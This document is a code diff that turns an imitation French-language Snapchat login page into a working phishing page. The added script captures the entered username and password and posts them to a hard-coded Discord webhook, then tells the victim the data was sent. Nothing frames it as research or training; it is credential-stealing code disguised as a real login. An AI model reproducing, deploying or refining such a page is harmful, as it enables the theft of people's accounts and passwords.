@@ -1,100 +1,86 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Connexion Snapchat</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       background-color: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      display: flex; justify-content: center; align-items: center;
       height: 100vh;
     }
-
     .login-box {
-      width: 100%;
-      max-width: 400px;
+      width: 100%; max-width: 400px;
       padding: 40px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       border-radius: 10px;
       text-align: center;
     }
-
-    .login-box img {
-      width: 60px;
-      margin-bottom: 20px;
-    }
-
-    .login-box h2 {
-      margin-bottom: 30px;
-      color: #000;
-    }
-
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px;
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 16px;
     }
-
-    .login-button {
+    button {
       background-color: #fffc00;
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 12px;
-      width: 100%;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 20px;
+      border: none; color: #000;
+      font-weight: bold; padding: 12px;
+      width: 100%; border-radius: 8px;
+      cursor: pointer; margin-top: 20px;
       font-size: 16px;
       transition: background-color 0.3s;
     }
-
-    .login-button:hover {
+    button:hover {
       background-color: #e6e600;
-    }
-
-    .small-text {
-      font-size: 13px;
-      margin-top: 20px;
-      color: #666;
-    }
-
-    a {
-      color: #000;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    a:hover {
-      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat logo">
     <h2>Se connecter à Snapchat</h2>
-
-    <form>
-      <input type="text" placeholder="Nom d'utilisateur ou e-mail" required>
-      <input type="password" placeholder="Mot de passe" required>
-      <button type="submit" class="login-button">Connexion</button>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
+      <input type="password" id="password" placeholder="Mot de passe" required />
+      <button type="submit">Connexion</button>
     </form>
-
-    <div class="small-text">
-      <p><a href="#">Mot de passe oublié ?</a></p>
-      <p>Vous n'avez pas de compte ? <a href="#">S'inscrire</a></p>
-    </div>
   </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const message = {
+        content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(message),
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Données envoyées avec succès !");
+          document.getElementById('loginForm').reset();
+        } else {
+          alert("Erreur lors de l'envoi des données.");
+        }
+      })
+      .catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
+    });
+  </script>
 </body>
 </html>
